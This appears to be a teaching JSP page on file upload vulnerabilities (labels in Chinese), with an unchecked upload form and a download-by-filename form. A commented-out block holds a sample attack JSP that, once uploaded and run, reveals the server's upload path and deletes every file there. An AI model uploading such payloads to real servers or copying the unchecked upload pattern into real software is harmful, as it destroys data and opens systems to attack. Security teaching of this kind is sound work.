<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<c:set var="ctx" value="${pageContext.request.contextPath}" />

<html>
<head>
    <title>web 安全之文件上传漏洞</title>
</head>

<body>
    <form  action="${ctx}/uploadFileDemoCtrl/uploadFile" method="post" enctype="multipart/form-data">
        选择文件进行上传：<input type="file" name="file"/>
        <input type="submit" value="上传"/>
    </form>

    <br/>

    <form  action="${ctx}/uploadFileDemoCtrl/downLoadFile" method="get">
        输入需要下载的文件名称：<input type="text" name="filename"/>
        <input type="submit" value="下载"/>
    </form>

</body>
</html>


<%--  攻击上传文件漏洞代码
<%@page import="java.io.File"%>
<%@ page language="java" contentType="text/html; charset=utf-8" pageEncoding="utf-8"%>
<%
    String root = request.getServletContext().getRealPath("/upload");
    out.write("系统部署文件上传的绝对路径:"+root);
    File file = new File(root);
    String[] tempList = file.list();
    File temp = null;
	String fileName;
    for (int i = 0; i < tempList.length; i++) {
        if (root.endsWith(File.separator)) {
			fileName = root + tempList[i];
        } else {
			fileName = root + File.separator + tempList[i];
        }
		temp = new File(fileName);
        if (temp.isFile()) {
			out.write("删除文件：" + fileName + "；");
			temp.delete();
        }
    }
    file.delete();
%>
--%>